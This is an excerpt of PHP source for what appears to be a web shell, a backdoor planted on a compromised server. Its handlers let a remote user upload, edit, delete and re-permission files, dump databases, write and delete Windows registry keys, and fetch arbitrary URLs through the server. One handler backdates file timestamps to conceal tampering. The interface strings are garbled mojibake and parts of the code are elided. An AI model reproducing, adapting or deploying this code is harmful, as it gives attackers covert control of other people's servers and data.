...
if ($_GET['action'] == "phpinfo") {
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() ?E?????,C?&lt;PHP???&gt;";
	exit;
}

if (isset($_POST['url'])) {
	$proxycontents = @file_get_contents($_POST['url']);
	echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>?E? URL ??E?EU</b></p></center></body>";
	exit;
}

if (!empty($downfile)) {
	if (!@file_exists($downfile)) {
		echo "<script>alert('????IA?I???O?!')</script>";
	} else {
...
if ($_POST['backuptype'] == 'download') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("E?????EU");
	@mysql_select_db($dbname) or die("??O?E???EU");	
...
if (!empty($delfile)) {
	if (file_exists($delfile)) {
		echo (@unlink($delfile)) ? $delfile." E?E!" : "I??E?EU!";
	} else {
...
elseif (!empty($deldir)) {
	...
	if (!file_exists("$deldirs")) {
		...
		echo (deltree($deldirs)) ? "??AE?E!" : "??AE?EU!";
	}
}
...
elseif (($createdirectory) AND !empty($_POST['newdirectory'])) {
	if (!empty($newdirectory)) {
		...
		if (file_exists("$mkdirs")) {
			...
			echo (@mkdir("$mkdirs",0777)) ? "MoSt3mRE?E E???E ??C C?O? E?C??E " : "EU!";
			@chmod("$mkdirs",0777);
		}
	}
}
...
elseif ($doupfile) {
	echo (@copy($_FILES['uploadfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfile']['name']."")) ? "EIE!" : "EIEU!";
}
...
elseif ($_POST['do'] == 'doeditfile') {
	if (!empty($_POST['editfilename'])) {
		...
		@$fp=fopen("$filename","w");
		echo $msg=@fwrite($fp,$_POST['filecontent']) ? "?EI??E!" : "?EEU!";
		@fclose($fp);
	} else {
		echo "CE?EI??༭?I???!";
	}
...
elseif ($_POST['do'] == 'editfileperm') {
	if (!empty($_POST['fileperm'])) {
		...
		echo (@chmod($dir."/".$file,$fileperm)) ? "E?O???E!" : "???EU!";
		echo " I?? ".$file." ??????E?OI?: ".substr(base_convert(@fileperms($dir."/".$file),10,8),-4);
	} else {
		echo "CE?EI??E???E?O!";
	}
}
...
elseif ($_POST['do'] == 'rename') {
	if (!empty($_POST['newname'])) {
		...
		if (@file_exists($newname)) {
			echo "".$_POST['newname']." ???O?,C???AE?E??!";
		} else {
			echo (@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname'])." E??I? ".$_POST['newname']." !" : "I??????EU!";
		}
	} else {
		echo "CE?EI????I???!";
	}
...
elseif ($_POST['do'] == 'domodtime') {
	if (!@file_exists($_POST['curfile'])) {
		...
		if (!@file_exists($_POST['tarfile'])) {
			...
			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." ????E?E?I? ".date("Y-m-d H:i:s",$time)." !" : "I??????E????EU!";
		}
	}
}
	...
	if (empty($_POST['table']) OR empty($_POST['backuptype'])) {
		...
		if ($_POST['backuptype'] == 'server') {
			...
			if ($filehandle) {
				...
				fclose($filehandle);
				echo "E?????E? <a href=\"".$path."\" target=\"_blank\">".$path."</a>";
				mysql_close();
			} else {
				echo "?EU,CEEI??I???EC?????E?EI?!";
			}
		}
	}
}
...
elseif(($_POST['do'] == 'viewphpvar') AND !empty($_POST['phpvarname'])) {
	echo "????IE? ".$_POST['phpvarname']." ??: ".getphpcfg($_POST['phpvarname'])."";
}
...
elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {
	...
	echo ($a=='0') ? "?Eע????E!" : "?E ".$_POST['regname'].", ".$_POST['regval'].", ".$_POST['regtype']." EU!";
}
...
elseif(($regdelete) AND !empty($_POST['delregname'])) {
	...
	echo ($a=='0') ? "E?ע????E!" : "E? ".$_POST['delregname']." EU!";
}
...
elseif ($_GET['action'] == "newtime") {
	...
	$tb->tdbody("From?: ".$tb->makeinput('curfile',$file,'readonly')." To: ".$tb->makeinput('tarfile','????AI???'),'center','2','30');
...
elseif ($_GET['action'] == "phpenv") {
	...
	$phpinfo=(!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
		$info = array(
			0  => array("??E ??OC? C??????",date("Y?mOAdE? h:i:s",time())),
			...
			21 => array("max execution time",getphpcfg("max_execution_time")."?"),
